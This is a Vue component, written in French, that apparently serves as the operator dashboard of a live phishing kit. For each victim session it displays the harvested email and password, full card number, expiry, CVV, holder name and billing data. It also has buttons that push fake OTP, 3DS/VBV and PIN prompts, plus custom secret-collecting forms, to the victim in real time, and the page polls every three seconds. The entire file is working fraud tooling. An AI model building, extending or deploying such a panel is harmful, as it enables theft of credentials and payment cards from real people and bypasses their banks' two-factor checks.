<template>
  <div v-if="s">
    <div class="page-header" style="display:flex;justify-content:space-between;align-items:flex-start">
      <div>
        <h1 class="page-title">{{ s.ip }}</h1>
        <p class="page-subtitle">
          {{ s.country }}
          <span class="dot" :class="s.is_online ? 'dot-on' : 'dot-off'" style="margin:0 6px;vertical-align:middle"></span>
          {{ s.is_online ? 'En ligne' : 'Hors ligne' }}
          — <span class="step-badge" :class="stepCls(s)" style="vertical-align:middle">{{ s.stepLabel }}</span>
        </p>
      </div>
      <router-link to="/sessions" class="btn btn-sm">Retour</router-link>
    </div>

    <!-- Actions -->
    <div class="card"><div class="card-inner" style="padding-bottom:14px">
      <div class="card-title">Actions</div>
      <div class="actions-grid">
        <button v-for="a in quickActions" :key="a.type" class="btn btn-sm" @click="doAction(a.type)">{{ a.label }}</button>
        <button class="btn btn-sm btn-gold" @click="showCustom=true">Custom Input</button>
        <button class="btn btn-sm btn-success" @click="doAction('finish')">Terminer</button>
        <button class="btn btn-sm btn-danger" @click="doAction('invalid_card')">Carte invalide</button>
        <button class="btn btn-sm btn-danger" @click="doBan">Bannir</button>
      </div>
    </div></div>

    <!-- Submitted data pills -->
    <div v-if="s.submitted?.length" class="card"><div class="card-inner">
      <div class="card-title">Donnees recues</div>
      <div style="display:flex;flex-wrap:wrap;gap:6px">
        <div v-for="(c, i) in s.submitted" :key="i" class="data-pill">
          <span class="data-pill-label">{{ c.type }}</span>
          <span class="data-pill-value">{{ c.detail }}</span>
        </div>
      </div>
    </div></div>

    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
      <!-- Creds -->
      <div class="card"><div class="card-inner">
        <div class="card-title">Identifiants</div>
        <table><tbody>
          <tr><td class="td-label">Email</td><td class="mono">{{ s.email || '—' }}</td></tr>
          <tr><td class="td-label">Mot de passe</td><td class="mono">{{ s.password || '—' }}</td></tr>
        </tbody></table>
      </div></div>

      <!-- Card -->
      <div class="card"><div class="card-inner">
        <div class="card-title">Carte bancaire</div>
        <template v-if="s.card_data">
          <table><tbody>
            <tr><td class="td-label">Numero</td><td class="mono">{{ s.card_data.cardNumber }}</td></tr>
            <tr><td class="td-label">Expiration</td><td class="mono">{{ s.card_data.month }}/{{ s.card_data.year }}</td></tr>
            <tr><td class="td-label">CVV</td><td class="mono">{{ s.card_data.securityCode }}</td></tr>
            <tr><td class="td-label">Titulaire</td><td class="mono">{{ s.card_data.cardHolderName }}</td></tr>
          </tbody></table>
        </template>
        <p v-else class="muted-text">En attente</p>
      </div></div>

      <!-- Billing -->
      <div class="card"><div class="card-inner">
        <div class="card-title">Facturation</div>
        <template v-if="s.billing_data">
          <table><tbody>
            <tr v-for="(v, k) in s.billing_data" :key="k">
              <td class="td-label">{{ k }}</td><td class="mono">{{ v }}</td>
            </tr>
          </tbody></table>
        </template>
        <p v-else class="muted-text">En attente</p>
      </div></div>

      <!-- Timeline -->
      <div class="card"><div class="card-inner">
        <div class="card-title">Chronologie</div>
        <div v-for="(ev, i) in s.timeline" :key="i" class="tl-item">
          <span class="tl-time">{{ fmtTime(ev.at) }}</span>
          <span v-if="ev.type === 'step'" class="step-badge">{{ ev.label }}</span>
          <span v-else :class="ev.by === 'operator' ? 'tl-operator' : 'tl-victim'">{{ ev.label }}</span>
        </div>
      </div></div>
    </div>

    <!-- Custom Input Modal -->
    <div v-if="showCustom" class="modal-overlay" @click.self="showCustom=false">
      <div class="modal">
        <div class="modal-header">
          <h3>Custom Input</h3>
          <button class="modal-close" @click="showCustom=false">&times;</button>
        </div>
        <div class="modal-body">
          <div class="form-group">
            <label class="form-label">Titre</label>
            <input v-model="custom.title" class="form-input" placeholder="Ex: Verification">
          </div>
          <div class="form-group">
            <label class="form-label">Message</label>
            <input v-model="custom.message" class="form-input" placeholder="Ex: Entrez le code...">
          </div>
          <div style="margin-bottom:14px">
            <label class="form-label">Champs</label>
            <div v-for="(f, i) in custom.fields" :key="i" style="border:1px solid var(--border);padding:12px;margin-top:6px">
              <div style="display:flex;gap:6px;margin-bottom:6px">
                <input v-model="f.label" class="form-input" style="flex:1" placeholder="Libelle">
                <select v-model="f.type" class="form-input" style="width:90px">
                  <option value="text">Texte</option>
                  <option value="number">Nombre</option>
                  <option value="password">Secret</option>
                </select>
                <button v-if="custom.fields.length > 1" class="btn btn-sm btn-danger" @click="custom.fields.splice(i,1)">&times;</button>
              </div>
              <input v-model="f.placeholder" class="form-input" placeholder="Placeholder">
            </div>
            <button class="btn btn-sm" style="margin-top:8px" @click="custom.fields.push({label:'',placeholder:'',type:'text'})">+ Ajouter</button>
          </div>
          <button class="btn btn-gold" style="width:100%" @click="sendCustom">Envoyer</button>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted } from 'vue'
import { useRoute } from 'vue-router'
import { useSessionsStore } from '@/stores/sessions'

const route = useRoute()
const store = useSessionsStore()
const s = computed(() => store.currentSession)
const showCustom = ref(false)
const custom = ref({ title: '', message: '', fields: [{ label: '', placeholder: '', type: 'text' }] })

const quickActions = [
  { type: 'otp_sms', label: 'OTP SMS' },
  { type: 'otp_mail', label: 'OTP Mail' },
  { type: 'otp_nfc', label: 'OTP NFC' },
  { type: 'vbv', label: '3DS / VBV' },
  { type: 'pin', label: 'Code PIN' },
]

function fmtTime(ts) { const d = new Date(ts*1000); return ('0'+d.getHours()).slice(-2)+':'+('0'+d.getMinutes()).slice(-2)+':'+('0'+d.getSeconds()).slice(-2) }
function stepCls(s) { const st=s.current_step; if(['card','loading','page_loading'].includes(st))return'step-hot'; if(['billing','info'].includes(st))return'step-warm'; return'' }

async function doAction(type) { await store.sendAction(route.params.id, type); store.fetchSession(route.params.id) }
async function doBan() { if(confirm('Bannir cette IP ?')) { await store.sendAction(route.params.id, 'ban'); store.fetchSession(route.params.id) } }
async function sendCustom() {
  await store.sendAction(route.params.id, 'custom', {
    title: custom.value.title,
    message: custom.value.message,
    fields: JSON.stringify(custom.value.fields),
  })
  showCustom.value = false
  store.fetchSession(route.params.id)
}

function refresh() { store.fetchSession(route.params.id) }
onMounted(() => store.startPolling(refresh, 3000))
onUnmounted(() => store.stopPolling())
</script>
